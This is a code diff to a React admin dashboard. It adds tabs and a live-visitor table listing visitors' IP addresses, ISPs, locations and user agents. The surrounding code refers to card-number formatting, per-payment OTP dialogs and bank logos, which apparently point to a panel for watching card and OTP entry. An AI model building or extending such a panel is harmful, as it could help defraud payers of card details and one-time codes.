@@ -10,6 +10,7 @@ import { useToast } from '@/hooks/use-toast';
 import { useSocket } from '../SocketContext';
 import { v4 as uuidv4 } from 'uuid';
 import { api } from '../utils/api';
+import Analytics from '../components/Analytics';
 
 const formatCardNumber = (cardNumber: string) => {
   if (!cardNumber) return '';
@@ -115,6 +116,7 @@ const Admin = () => {
   const [paymentLinkAmount, setPaymentLinkAmount] = useState<string>('');
   const [paymentLinkCurrency, setPaymentLinkCurrency] = useState<string>('INR');
   const [generatedLink, setGeneratedLink] = useState<string>('');
+  const [activeTab, setActiveTab] = useState<'payments' | 'visitors' | 'analytics'>('payments');
   const [showOtpModal, setShowOtpModal] = useState(false);
   const [selectedPaymentId, setSelectedPaymentId] = useState<string>('');
   const [selectedBankLogo, setSelectedBankLogo] = useState<string>('');
@@ -1584,7 +1586,46 @@ const Admin = () => {
           </DialogContent>
         </Dialog>
 
-        {/* Generate Payment Link Section */}
+        {/* Tab Navigation */}
+        <div className="bg-gray-900 rounded-lg mb-6 p-1">
+          <div className="flex space-x-1">
+            <button
+              onClick={() => setActiveTab('payments')}
+              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
+                activeTab === 'payments'
+                  ? 'bg-blue-600 text-white'
+                  : 'text-gray-400 hover:text-white hover:bg-gray-800'
+              }`}
+            >
+              💳 Payments
+            </button>
+            <button
+              onClick={() => setActiveTab('visitors')}
+              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
+                activeTab === 'visitors'
+                  ? 'bg-blue-600 text-white'
+                  : 'text-gray-400 hover:text-white hover:bg-gray-800'
+              }`}
+            >
+              👀 Visitors
+            </button>
+            <button
+              onClick={() => setActiveTab('analytics')}
+              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
+                activeTab === 'analytics'
+                  ? 'bg-blue-600 text-white'
+                  : 'text-gray-400 hover:text-white hover:bg-gray-800'
+              }`}
+            >
+              📊 Analytics
+            </button>
+          </div>
+        </div>
+
+        {/* Tab Content */}
+        {activeTab === 'payments' && (
+          <>
+            {/* Generate Payment Link Section */}
         <div className="bg-gray-900 rounded-lg overflow-hidden mb-6 sm:mb-8">
           <div className="p-4 sm:p-6 border-b border-gray-700">
             <h2 className="text-lg sm:text-xl font-semibold">Generate Payment Link</h2>
@@ -2494,6 +2535,139 @@ const Admin = () => {
             </div>
           </DialogContent>
         </Dialog>
+          </>
+        )}
+
+        {/* Visitors Tab */}
+        {activeTab === 'visitors' && (
+          <div className="bg-gray-900 rounded-lg overflow-hidden">
+            <div className="p-4 sm:p-6 border-b border-gray-700">
+              <h2 className="text-lg sm:text-xl font-semibold">Live Visitors</h2>
+              <p className="text-gray-400 mt-1 text-sm sm:text-base">Real-time visitor tracking ({liveVisitors.length} active)</p>
+            </div>
+            
+            {/* Mobile-friendly visitor cards */}
+            <div className="block sm:hidden">
+              {liveVisitors.length === 0 ? (
+                <div className="p-6 text-center text-gray-400">
+                  No live visitors at the moment
+                </div>
+              ) : (
+                liveVisitors.map((visitor) => (
+                  <div key={visitor.id} className="p-4 border-b border-gray-700 last:border-b-0">
+                    <div className="flex items-center justify-between mb-2">
+                      <div className="bg-red-600 text-black px-2 py-1 rounded font-bold text-sm">
+                        {visitor.ipAddress}
+                      </div>
+                      <span className="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium bg-green-100 text-green-800">
+                        <div className="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></div>
+                        Online
+                      </span>
+                    </div>
+                    <div className="space-y-1 text-sm">
+                      <div className="flex items-center gap-2">
+                        <span className="text-gray-400">ISP:</span>
+                        <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs">
+                          {visitor.isp || 'Loading...'}
+                        </div>
+                      </div>
+                      <div className="flex items-center gap-2">
+                        <span className="text-gray-400">Location:</span>
+                        <span className="text-gray-300">{visitor.country || 'Unknown'}, {visitor.city || 'Unknown'}</span>
+                      </div>
+                      <div className="text-xs text-gray-400">
+                        {new Date(visitor.timestamp).toLocaleString()}
+                      </div>
+                    </div>
+                  </div>
+                ))
+              )}
+            </div>
+            
+            {/* Desktop table view */}
+            <div className="hidden sm:block overflow-x-auto">
+              <table className="w-full">
+                <thead className="bg-gray-800">
+                  <tr>
+                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                      Timestamp
+                    </th>
+                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                      IP Address
+                    </th>
+                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                      ISP
+                    </th>
+                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                      Location
+                    </th>
+                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                      User Agent
+                    </th>
+                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                      Status
+                    </th>
+                  </tr>
+                </thead>
+                <tbody className="divide-y divide-gray-700">
+                  {liveVisitors.length === 0 ? (
+                    <tr>
+                      <td colSpan={6} className="px-6 py-8 text-center text-gray-400">
+                        No live visitors at the moment
+                      </td>
+                    </tr>
+                  ) : (
+                    liveVisitors.map((visitor) => (
+                      <tr key={visitor.id} className="hover:bg-gray-800">
+                        <td className="px-6 py-4 whitespace-nowrap text-sm">
+                          {new Date(visitor.timestamp).toLocaleString()}
+                        </td>
+                        <td className="px-6 py-4 whitespace-nowrap">
+                          <div className="bg-red-600 text-black px-3 py-1 rounded font-bold text-sm">
+                            {visitor.ipAddress}
+                          </div>
+                        </td>
+                        <td className="px-6 py-4 whitespace-nowrap text-sm">
+                          <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-medium">
+                            {visitor.isp || 'Loading...'}
+                          </div>
+                        </td>
+                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
+                          <div className="flex flex-col">
+                            <span className="text-xs text-gray-400">{visitor.country || 'Unknown'}</span>
+                            <span className="text-xs">{visitor.city || 'Unknown'}</span>
+                          </div>
+                        </td>
+                        <td className="px-6 py-4 text-sm text-gray-300">
+                          <div className="max-w-xs truncate" title={visitor.userAgent}>
+                            {visitor.userAgent}
+                          </div>
+                        </td>
+                        <td className="px-6 py-4 whitespace-nowrap">
+                          <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
+                            <div className="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></div>
+                            Online
+                          </span>
+                        </td>
+                      </tr>
+                    ))
+                  )}
+                </tbody>
+              </table>
+            </div>
+          </div>
+        )}
+
+        {/* Analytics Tab */}
+        {activeTab === 'analytics' && (
+          <div className="bg-gray-900 rounded-lg p-6">
+            <Analytics 
+              socket={socket} 
+              globalCurrency={globalCurrency} 
+              exchangeRate={exchangeRate} 
+            />
+          </div>
+        )}
       </div>
     </div>
   );
